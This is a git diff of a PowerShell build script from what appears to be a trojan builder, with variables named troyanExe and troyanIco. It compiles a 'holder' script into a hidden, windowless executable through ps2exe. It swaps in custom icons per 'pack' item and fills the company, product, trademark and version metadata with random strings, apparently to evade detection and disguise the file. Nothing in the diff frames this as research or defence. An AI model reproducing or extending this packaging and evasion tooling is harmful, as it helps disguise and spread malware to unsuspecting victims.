@@ -33,10 +33,27 @@ if (-not (Test-Path -Path $server.userTroyanIco))
 Remove-FileIfExists -filePath $server.troyanExe
 
 
+$outputFile = $server.userTroyanExe    
+$iconFile = $server.troyanIco
+ 
+if ([string]::IsNullOrEmpty($packId) -eq $false) {
+    $pack = $server.pack.items | Where-Object { $_.id -eq $packId }
+    if (-not $pack) {
+        throw "Item with id '$packId' not found in pack items."
+    }
+    $outputFile= $pack.packFileExe
+    if ([string]::IsNullOrEmpty($pack.icon) -eq $false) {
+        if ((Test-Path -Path $pack.iconFile))
+        {
+            $iconFile = $pack.iconFile
+        }
+    }
+}   
+
 Invoke-ps2exe `
     -inputFile $server.holderRelease `
     -outputFile $server.troyanExe `
-    -iconFile $server.troyanIco `
+    -iconFile $iconFile `
     -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
     -company (Get-RandomString) `
     -product (Get-RandomString) `
@@ -45,15 +62,8 @@ Invoke-ps2exe `
     -trademark (Get-RandomString) `
     -version (Get-RandomVersion)
 
-$outputFile = $server.userTroyanExe    
- 
-if ([string]::IsNullOrEmpty($packId) -eq $false) {
-    $pack = $server.pack.items | Where-Object { $_.index -eq $packId }
-    if (-not $pack) {
-        throw "Item with index '$packId' not found in pack items."
-    }
-    $outputFile= $pack.packFileExe
-}   
+
+
 
 Write-Host "Output exe: $outputFile"
 
